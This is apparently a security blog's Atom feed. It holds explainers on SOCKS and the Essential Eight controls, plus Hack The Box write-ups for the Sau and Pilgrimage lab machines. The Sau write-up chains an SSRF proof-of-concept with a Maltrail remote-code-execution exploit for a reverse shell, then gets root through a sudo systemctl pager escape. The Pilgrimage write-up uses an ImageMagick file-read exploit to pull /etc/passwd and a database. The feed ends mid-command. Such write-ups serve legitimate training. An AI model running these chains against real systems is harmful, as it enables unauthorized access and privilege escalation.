<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-11-01T21:49:47+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">SOCKS4 vs SOCKS5</title><link href="https://emdeh.github.io/blog/2023/socks/" rel="alternate" type="text/html" title="SOCKS4 vs SOCKS5"/><published>2023-10-31T14:14:00+00:00</published><updated>2023-10-31T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/socks</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/socks/"><![CDATA[<h2 id="whare-is-socks">Whare is SOCKS</h2> <p>SOCKS stands for “SOCKet Secure” and is a protocol used for proxy servers. The protocol establishes a TCP connection to another server behind a firewall. The term “socket” refers to the combination of an IP address and port number.</p> <p>Here are the primary differences between SOCKS4 and SOCKS5:</p> <h2 id="socks4">SOCKS4</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP only.</li> <li><strong>Authentication</strong>: Doesn’t support authentication natively. Anyone with the proxy address and port can use it.</li> <li><strong>Hostname Resolution</strong>: Cannot resolve hostnames; requires the client to resolve the hostname to an IP address.</li> </ul> <h2 id="socks5">SOCKS5</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP and UDP.</li> <li><strong>Authentication</strong>: Provides a range of authentication mechanisms, including no authentication, username/password, and GSS-API.</li> <li><strong>Hostname Resolution</strong>: Can resolve hostnames, which means you can pass a domain name that SOCKS5 will resolve for you.</li> </ul> <p>Here’s a simple comparison in terms of features:</p> <table> <thead> <tr> <th>Feature</th> <th>SOCKS4</th> <th>SOCKS5</th> </tr> </thead> <tbody> <tr> <td>TCP Support</td> <td>✅</td> <td>✅</td> </tr> <tr> <td>UDP Support</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Authentication</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Hostname Resolution</td> <td>❌</td> <td>✅</td> </tr> </tbody> </table> <p>SOCKS5 is generally considered more secure and versatile due to its advanced features like authentication and support for both TCP and UDP protocols.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="SOCKS"/><category term="socket"/><category term="TCP"/><summary type="html"><![CDATA[Differences between SOCKS 4 and 5]]></summary></entry><entry><title type="html">Essential Eight Explainers</title><link href="https://emdeh.github.io/blog/2023/Essential-Eight/" rel="alternate" type="text/html" title="Essential Eight Explainers"/><published>2023-10-30T14:14:00+00:00</published><updated>2023-10-30T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Essential-Eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Essential-Eight/"><![CDATA[<h2 id="what-are-the-essential-eight">What are the Essential Eight</h2> <p>The Australian Signals Directorate’s <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-explained"> Essential Eight Strategies to Mitigate Cyber Security Incidents</a> was developed as a prioritised baseline to assist organisations in protecting their systems against a range of cyber threats.</p> <p>Notably, the Essential Eight is just a starting point and is not exhaustive. Organisations should conduct regular risk assessments and adopt additional strategies based on their specific threat environment.</p> <p>For government entities covered by the Protective Security Policy Framework (PSPF), <a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats">Policy 10: Safeguarding data from cyber threats</a> specifies that in addition to implementing the Essential Eight, entities should:</p> <blockquote> <p><em>“[consider] which of the remaining mitigation strategies from the <a href="https://www.cyber.gov.au/acsc/view-all-content/strategies-to-mitigate-cyber-security-incidents">Strategies to Mitigate Cyber Security Incidents</a> need to be implemented to achieve an acceptable level of residual risk for their entity.”</em></p> </blockquote> <p>Over the coming months, I’ll endeavour to produce PoCs and more detailed explainers that demonstrate why each of the Essential Eight is important and add to the <a href="https://emdeh.com/essential-eight-explainers/">Essential Eight Collection</a>, currently available in the navbar.</p> <p>The table below lists the Essential Eight, the typical exploits each strategy helps protect against and a brief example.</p> <h2 id="essential-eight-strategies">Essential Eight Strategies</h2> <p>1 - Application Control 2 - Patch Applications 3 - Configure Microsoft Office macro settings 4 - User Application Hardening 5 - Restrict Administrative Privileges 6 - Patch Operating Systems 7 - Multi-Factor Authentication 8 - Daily Backups</p> <table> <thead> <tr> <th>Strategy</th> <th>Typical Exploits Protected Against</th> <th>Example Exploit</th> </tr> </thead> <tbody> <tr> <td>Application Control</td> <td>Unauthorised/malicious software execution.</td> <td>A user unknowingly downloads and runs ransomware.</td> </tr> <tr> <td>Patch Applications</td> <td>Exploitation of known software vulnerabilities.</td> <td>Attacker exploits a known vulnerability in a PDF reader to run malicious code.</td> </tr> <tr> <td>Configure Microsoft Office macro settings</td> <td>Macro-based malware.</td> <td>A user opens an Office document from a phishing email which runs a malicious macro.</td> </tr> <tr> <td>User Application Hardening</td> <td>Drive-by downloads and web-based malicious content.</td> <td>A user visits a compromised website which then attempts to run Flash-based malware.</td> </tr> <tr> <td>Restrict Administrative Privileges</td> <td>Attacks that require admin rights to execute.</td> <td>An attacker gains user credentials that have unnecessary privileges and install keyloggers.</td> </tr> <tr> <td>Patch Operating Systems</td> <td>Exploitation of known OS vulnerabilities.</td> <td>Attacker exploits a known Windows vulnerability to gain remote code execution.</td> </tr> <tr> <td>Multi-Factor Authentication</td> <td>Credential theft or brute-force attacks.</td> <td>An attacker has a user’s password and can access their account remotely without the need for additonal authentication factors.</td> </tr> <tr> <td>Daily Backups</td> <td>Data loss due to ransomware, hardware failures, or accidental deletions.</td> <td>Ransomware encrypts a user’s files, but they can’t be restored from a backup.</td> </tr> </tbody> </table>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[Essential Eight security controls]]></summary></entry><entry><title type="html">Sau</title><link href="https://emdeh.github.io/blog/2023/Sau/" rel="alternate" type="text/html" title="Sau"/><published>2023-10-16T14:14:00+00:00</published><updated>2023-10-16T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Sau</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Sau/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Sau is an Easy machine on Hack The Box that focuses on exploiting two vulnerabilities to ultimately obtain initial access. Privilege escalation is then achieved by exploiting a legitimate binary.</p> <h1 id="enumeration">Enumeration</h1> <p>Nmap reveals three ports:</p> <ul> <li>22</li> <li>80</li> <li>55555</li> </ul> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.82.3 <span class="nt">-oA</span> nmap-sau
 
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 15 Oct 2023 04:01:09 GMT
|     Content-Length: 75
|     invalid basket name<span class="p">;</span> the name does not match pattern: ^[wd-_<span class="se">\.</span><span class="o">]{</span>1,250<span class="o">}</span><span class="err">$</span>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Location: /web
|     Date: Sun, 15 Oct 2023 04:00:37 GMT
|     Content-Length: 27
|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 15 Oct 2023 04:00:38 GMT
|_    Content-Length: 0
&lt;SNIP&gt;
</code></pre></div></div> <p>SSH is a dead end and port 80 is filtered, but browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555</code> lands on a site titled <strong>Request Baskets</strong>.</p> <h2 id="whats-request-baskets">What’s Request Baskets?</h2> <p>Request Baskets is a concept, often implemented as a tool or a service, used to capture, inspect, and debug HTTP requests. It provides a temporary “basket” or “bucket” that captures incoming HTTP requests for analysis. This is particularly useful for debugging webhooks, HTTP clients, or other services that send HTTP requests.</p> <p>An implementation usually works like this:</p> <ol> <li><strong>Create</strong> a new Request Basket, which provides a unique URL endpoint.</li> <li><strong>Configure</strong> the application, webhook, or service to send HTTP requests to the URL.</li> <li><strong>Inspect</strong> the incoming HTTP requests to the basket</li> <li>Use the captured information, to <strong>test or debug issues</strong>, validate payloads, or run other types of tests.</li> </ol> <p>We can see that this particular implementation is on version 1.2.1, which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163"> <em>CVE-2023–27163 - a Server-Side Request Forgery (SSRF)</em></a></p> <h2 id="whats-ssrf">What’s SSRF?</h2> <p>SSRF, or Server-Side Request Forgery, is a security vulnerability that allows an attacker to make requests to internal resources within an organization’s network, effectively bypassing firewalls. In SSRF attacks, <strong><em>the attacker manipulates a vulnerable web application to make requests to an internal resource,</em></strong> which could be anything from cloud services to databases or even restricted parts of the web application itself.</p> <p>The attack often occurs when a web application doesn’t properly validate or sanitise user input for URLs. An attacker can then trick the server into making an unauthorised request to internal resources, potentially revealing sensitive information or even executing commands.</p> <p>It’s particularly concerning in cloud environments, where metadata APIs can expose sensitive data that can lead to more severe attacks like privilege escalation.</p> <p>Prevention often involves input validation, restricting outbound requests from the server, or implementing allow lists for permissible URLs.</p> <h1 id="attack-vector">Attack vector</h1> <p>Given port 80 is filtered but there is an implementation of Request Baskets on port 55555 that is vulnerable to SSRF, this appears to provide a way to forward requests to the service running on port 80. A PoC of the SSRF vulnerability on Request-Baskets can be found <a href="https://github.com/entr0pie/CVE-2023-27163">here</a>.</p> <h2 id="testing">Testing</h2> <p>Creating a new basket in the web app and then configuring port 80 as the forward URL on a local interface can confirm this.</p> <p>Hovering over the <code class="language-plaintext highlighter-rouge">Proxy Response</code> option, we can see it will <em>Proxy the response from the forward url back to the client</em>.</p> <p>Checking this option will return the response from <code class="language-plaintext highlighter-rouge">http://localhost:80</code>.</p> <p><img src="/assets/img/2023-sau/20231016-sau-2.png" class="auto-resize"/></p> <p>Triggering a request by browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555/wnnyr21</code> returns a seemingly malformed web app called <strong>Maltrail</strong>. <img src="/assets/img/2023-sau/20231016-sau-5.png" class="auto-resize"/></p> <p>The app is running version 0.53 which is vulnerable to a <strong>Remote Code Execution.</strong></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>searchsploit maltrail
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                       |  Path
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
Maltrail v0.53 - Unauthenticated Remote Code Executi | python/webapps/51676.py
</code></pre></div></div> <h1 id="initial-access">Initial access</h1> <p>Using the first exploit, a basket can be created that, when accessed, will make a request to <code class="language-plaintext highlighter-rouge">http://localhost:80</code>, as tested manually.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>./CVE-2023-27163.sh http://10.129.82.3:55555/ http://localhost:80
Proof-of-Concept of SSRF on Request-Baskets <span class="o">(</span>CVE-2023-27163<span class="o">)</span> <span class="o">||</span> More info at https://github.com/entr0pie/CVE-2023-27163

<span class="o">&gt;</span> Creating the <span class="s2">"ndapra"</span> proxy basket...
<span class="o">&gt;</span> Basket created!
<span class="o">&gt;</span> Accessing http://10.129.82.3:55555/ndapra now makes the server request to http://localhost:80.
./CVE-2023-27163.sh: line 43: jq: <span class="nb">command </span>not found
<span class="o">&gt;</span> Response body <span class="o">(</span>Authorization<span class="o">)</span>: <span class="o">{</span><span class="s2">"token"</span>:<span class="s2">"uQW06XHLrVKiZsq2XbeXRbrb6PRlQ53tTAVeaA-Puolb"</span><span class="o">}</span>
</code></pre></div></div> <p>This basket can then be used to proxy the second exploit to the vulnerable implementation of Maltrail.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>python3 51676.py 10.10.14.12 4321  http://10.129.82.3:55555/ndapra
Running exploit on http://10.129.82.3:55555/ndapra/login
</code></pre></div></div> <p>The payload is executed on the Maltrail instance running on port 80, and a reverse shell is sucessfully caught on the listener.</p> <p><img src="/assets/img/2023-sau/20231016-sau-3.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Privilege escalation is reasonably straight forward.</p> <p>Checking what the user can run as sudo returns one binary: <code class="language-plaintext highlighter-rouge">/usr/bin/systemctl status trail.service</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puma on sau:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User puma may run the following commands on sau:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
</code></pre></div></div> <p><a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFOBIns</a> says the following about <code class="language-plaintext highlighter-rouge">systemctl</code> ran as sudo:</p> <blockquote> <p><em>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.</em></p> </blockquote> <p>Running the binary seems to drop into a new terminal session:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
</code></pre></div></div> <p>Attempting to execute a new shell from this terminal will spawn it under sudo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)!</span>/bin/sh
<span class="o">!</span>//bbiinn//sshh!/bin/sh
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
</code></pre></div></div> <p><img src="/assets/img/2023-sau/20231016-sau-4.png" class="auto-resize"/></p> <p>Done and dusted!</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="RCE"/><category term="SSRF"/><summary type="html"><![CDATA[Sau - Hack The Box write-up]]></summary></entry><entry><title type="html">Pilgrimage</title><link href="https://emdeh.github.io/blog/2023/pilgrimage-write-up/" rel="alternate" type="text/html" title="Pilgrimage"/><published>2023-10-15T14:14:00+00:00</published><updated>2023-10-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/pilgrimage-write-up</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/pilgrimage-write-up/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Pilgrimage is a relatively challenging Easy box where an Arbitrary File Read vulnerability is exploited to steal a username..</p> <p>The same exploit used in the AFR vulnerability is used against a Local File Inclusion vulnerability, which ultimately provided the user’s password.</p> <p>Once logged in <a href="https://github.com/DominicBreuker/pspy">pspy64</a> finds a script executing as <code class="language-plaintext highlighter-rouge">root</code>, that is using a version of <code class="language-plaintext highlighter-rouge">binwalk</code> that is vulnerable to Remote Code Execution.</p> <p>This is ultimately used to elevate privileges to <code class="language-plaintext highlighter-rouge">root</code>.</p> <h2 id="tools-exploits-and-cves">Tools, exploits, and CVEs</h2> <table> <thead> <tr> <th>Tool</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><a href="https://github.com/arthaud/git-dumper">Git Dumper</a></td> <td>A tool to dump a git repository from a website.</td> </tr> <tr> <td><a href="https://github.com/voidz0r/CVE-2022-44268">CVE-2022-44268 AFR PoC</a></td> <td>This is a proof of concept of the ImageMagick bug discovered by <a href="https://www.metabaseq.com/imagemagick-zero-days/">https://www.metabaseq.com/imagemagick-zero-days/</a>Tested on ImageMagick v. 7.1.0-48 and 6.9.11-60</td> </tr> <tr> <td><a href="https://github.com/DominicBreuker/pspy">Pspy</a></td> <td>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</td> </tr> <tr> <td><a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath#cve-2022-4510-binwalk">CVE-2022-4510-Binwalk RCE Poc</a></td> <td>This script allows you to generate exploits for targeting CVE-2022-4510 Binwalk vulnerabilities. The exploits can be used for testing and demonstrations. The supported options include SSH, command execution, and reverse shell.</td> </tr> </tbody> </table> <h2 id="whats-an-arbitrary-file-read">What’s an Arbitrary File Read</h2> <p>An Arbitrary File Read vulnerability allows an attacker to read files on a system that they shouldn’t have access to. This could include sensitive configuration files, database credentials, or any other sensitive data stored on the server. The vulnerability occurs due to improper validation or lack of permissions in the application’s code, and it can lead to information disclosure or further exploitation if chained with other vulnerabilities.</p> <h2 id="whats-a-local-file-inclusion-lfi">What’s a Local File Inclusion (LFI)</h2> <p>A Local File Inclusion (LFI) vulnerability allows an attacker to include files from the server’s local filesystem into the output of a web application. This can lead to sensitive information disclosure, such as reading the /etc/passwd file on a Linux machine. LFI vulnerabilities typically occur due to poor validation of user input in web applications and can sometimes be escalated to execute arbitrary code on the server.</p> <h2 id="whats-binwalk">What’s binwalk?</h2> <p>Binwalk is a tool commonly used for analyzing, reverse engineering, and extracting firmware images. It’s widely used for security research and has various functionalities suitable for exploring a file’s structure. Essentially, it scans the given binary file for known patterns or “magic bytes,” then provides you with information about what each segment of bytes represents.</p> <p>For instance, you might use binwalk to:</p> <ul> <li>Identify embedded file systems in a firmware image.</li> <li>Extract those file systems for further analysis.</li> <li>Identify executable code, or other types of data, embedded in the firmware.</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>Began with nmap scan</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.80.229 <span class="nt">-v</span> <span class="nt">-oA</span> nmap-pilgrimage

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Oct 15 21:07:33 2023 -- 1 IP address (1 host up) scanned in 44.45 seconds</span>
</code></pre></div></div> <p>Two ports:</p> <ul> <li>22</li> <li>80</li> </ul> <p>Browsing to IP returns <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/</code>. Add to hosts:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.80.229 pilgrimage.htb
</code></pre></div></div> <h1 id="site-enumeration">Site enumeration</h1> <p>Lands on a site that appears to be a free online image shrinker. <img src="/assets/img/20231016-pilgrimage-1.png" alt="Image of site" class="auto-resize"/></p> <p>Appears you can register or login, but that is not necessary to use the service.</p> <p>Uploading a file shrinks it and provides a url to the location: <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/shrunk/652c8e6fd005d.png</code></p> <p>Navigating to <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/shrunk/</code> returns a 403 error</p> <p>Looking at port 80 more closely, and a git repo is found:</p> <p>Looking at port 80 more closely, and a git repo is found:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p</span> 80 10.129.80.229
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-15 21:44 EDT
Nmap scan report <span class="k">for </span>pilgrimage.htb <span class="o">(</span>10.129.80.229<span class="o">)</span>
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.129.80.229:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. <span class="c"># Please ...</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.81 seconds
</code></pre></div></div> <h1 id="git-repo-enumeration">Git Repo enumeration</h1> <p>Used https://github.com/arthaud/git-dumper.git to dump git repo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/findings]
└─<span class="nv">$ </span>git-dumper http://pilgrimage.htb/.git git
</code></pre></div></div> <p>Appears to use <code class="language-plaintext highlighter-rouge">magick</code>, command-line utility that is part of the ImageMagick suite of tools. ImageMagick is a software suite to create, edit, compose, or convert bitmap images. It can read, convert, and write images in a variety of formats like JPEG, PNG, GIF, BMP, and many others. The magick command is used for converting between image formats as well as resizing, cropping, and performing other image manipulation tasks.</p> <p>&lt;img src=”/assets/img/20231016-pilgrimage-2.png” alt=”Image of git”class=”auto-resize”&gt;</p> <p>Can pull the version:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/findings/git]
└─<span class="nv">$ </span>./magick <span class="nt">-usage</span>
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
</code></pre></div></div> <p>The magick version is vulnerable to a <strong>Arbitrary File Read</strong> <img src="/assets/img/220231016-pilgrimage-3.png" alt="Image of searchsploit" class="auto-resize"/></p> <h2 id="initial-access">Initial access</h2> <h2 id="arbitrary-file-read">Arbitrary File Read</h2> <p>Used https://github.com/voidz0r/CVE-2022-44268 PoC.</p> <p>Read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and found user <code class="language-plaintext highlighter-rouge">emily</code> <img src="/assets/img/20231016-pilgrimage-4.png" alt="Image found user" class="auto-resize"/></p> <h2 id="local-file-inclusion">Local File Inclusion</h2> <p>The <strong>dashboard.php</strong> makes queries to a SQLite database at <code class="language-plaintext highlighter-rouge">/var/db/pilgrimage</code></p> <p>Downloaded DB using the LFI vulnerability</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─<span class="nv">$ </span>cargo run <span class="s2">"/var/db/pilgrimage"</span>
    Finished dev <span class="o">[</span>unoptimized + debuginfo] target<span class="o">(</span>s<span class="o">)</span> <span class="k">in </span>0.02s
     Running <span class="sb">`</span>target/debug/cve-2022-44268 /var/db/pilgrimage<span class="sb">`</span>

</code></pre></div></div> <p>Upload image.png and download converted file, and grab hex response:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─<span class="nv">$ </span>identify <span class="nt">-verbose</span> 652ca0d768621.png
Image: 652ca0d768621.png
  Format: PNG <span class="o">(</span>Portable Network Graphics<span class="o">)</span>
  Geometry: 100x100
  Class: PseudoClass
  Type: palette
  Depth: 1 bits-per-pixel component
  Channel Depths:
    Red:      1 bits
    Green:    1 bits
    Blue:     1 bits
  Channel Statistics:
    Red:
      Minimum:                 65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Maximum:                 65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Mean:                    65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
    Green:
      Minimum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Maximum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Mean:                        0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
    Blue:
      Minimum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Maximum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Mean:                        0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
  Colors: 2
    0: <span class="o">(</span>255,  0,  0<span class="o">)</span>      red
    1: <span class="o">(</span>255,255,255<span class="o">)</span>      white
  Gamma: 0.45455
  Chromaticity:
    red primary: <span class="o">(</span>0.64,0.33<span class="o">)</span>
    green primary: <span class="o">(</span>0.3,0.6<span class="o">)</span>
    blue primary: <span class="o">(</span>0.15,0.06<span class="o">)</span>
    white point: <span class="o">(</span>0.3127,0.329<span class="o">)</span>
  Filesize: 1.1Ki
  Interlace: No
  Orientation: Unknown
  Background Color: <span class="c">#FEFEFE</span>
  Border Color: <span class="c">#DFDFDF</span>
  Matte Color: <span class="c">#BDBDBD</span>
  Page geometry: 100x100+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 3
  Png:IHDR.bit-depth-orig: 1
  Raw profile <span class="nb">type</span>:

   20480
53514c69746520666f726d61742033001000010100402020000000440000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000044002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
&lt;SNIP&gt;

6e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f
363532633963376562306134642e706e670231036909687474703a2f2f70696c6772696d
6167652e6874622f736872756e6b2f363532633939623661643562392e706e67

  Date:create: 2023-10-16T02:32:55+00:00
  Date:modify: 2023-10-16T02:32:55+00:00
  Date:timestamp: 2023-10-16T02:32:55+00:00
  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6
  Tainted: False
  User Time: 0.040u
  Elapsed Time: 0m:0.005439s
  Pixels Per Second: 1.8Mi
</code></pre></div></div> <p>Save hex to file and remove <code class="language-plaintext highlighter-rouge">\n</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> &lt; db-hex <span class="o">&gt;</span> cleaned-db-hex
